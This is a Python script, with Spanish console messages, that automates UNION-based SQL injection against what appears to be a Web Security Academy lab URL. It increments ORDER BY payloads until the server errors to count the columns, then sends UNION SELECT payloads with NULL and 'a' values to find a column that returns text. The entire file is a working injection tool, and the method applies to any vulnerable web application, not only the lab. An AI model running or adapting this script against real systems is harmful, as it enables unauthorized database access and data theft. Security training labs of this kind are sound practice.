import requests, signal, sys

def get_columns(URL):
    for column in range(1,100):
        payload = URL + "'+ORDER+BY+{}--".format(column)
        print("Realizando peticion a: {}".format(payload))
        
        #GET /filter?category=Pets'+ORDER+BY+3--
        response = requests.get(payload)

        if response.status_code == 500:
            num_columns = column - 1
            print("El codigo de estado es: {}\n".format(response.status_code)) 
            return num_columns
        
        print("El numero de columnas es {}\n".format(column))

def generate_null_vaules(columns):
    char_null = 'NULL'
    data = []
    for i in range(0,columns):
        data.append(char_null)
    return data

def find_valid_column(columns,values_null):

    check_vales_in_colums = []

    for i in range(0,columns):
        value = "'a'"
        values_null[i] = value
        values_null_str = ','.join(values_null)
        values_null[i] = 'NULL'
        check_vales_in_colums.append(values_null_str)
    
    return check_vales_in_colums

def send_payloads(URL,values):
    for value in values:
        paylaod = "{}'+UNION+SELECT+{}--".format(URL,value)
        
        response = requests.get(paylaod)

        if response.status_code == 200:
            print("El payload correcto es: {}\n".format(paylaod))

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def main():
    URL = "https://ac6c1fff1ff884a0801bc99a00a700bb.web-security-academy.net/filter?category=Gifts"

    signal.signal(signal.SIGINT, def_handler)

    columns = get_columns(URL)
    values_null = generate_null_vaules(columns)
    values = find_valid_column(columns,values_null)

    send_payloads(URL,values)

if __name__ == "__main__":    
    main()